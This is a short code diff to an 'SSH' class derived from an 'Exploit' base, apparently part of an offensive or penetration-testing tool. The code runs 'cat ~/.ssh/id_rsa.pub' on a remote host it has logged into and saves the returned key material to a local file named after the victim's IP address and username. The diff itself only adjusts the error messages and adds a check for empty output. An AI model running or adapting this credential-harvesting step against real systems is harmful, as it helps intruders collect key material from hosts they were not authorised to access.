@@ -25,13 +25,16 @@ class SSH(Exploit):
         try:
             stdin, stdout, stderr = ssh.exec_command('cat ~/.ssh/id_rsa.pub')
         except:
-            print(f"{Color.BMAGEN}No SSH keys found.{Color.END}", file=self.output)
+            print(f"{Color.BRED}Command line failed{Color.END}", file=self.output)
         else:
             keys_bytes = stdout.read()
             keys = keys_bytes.decode(encoding='UTF-8')
-            with open(f"./data/{ip_address}_{username}_sshkey.txt", "w") as text_file:
-                text_file.write(keys)
-            print(f"{Color.BGRN}Success.{Color.END}{Color.BMAGEN} SSH keys saved in Data folder.{Color.END}", file=self.output)
+            if keys:
+                with open(f"./data/{ip_address}_{username}_sshkey.txt", "w") as text_file:
+                    text_file.write(keys)
+                print(f"{Color.BGRN}Success.{Color.END}{Color.BMAGEN} SSH keys saved in Data folder.{Color.END}", file=self.output)
+            else:
+                print(f"{Color.BRED}No SSH keys found for {username}.{Color.END}", file=self.output)
         finally:
             stdin.close()
 
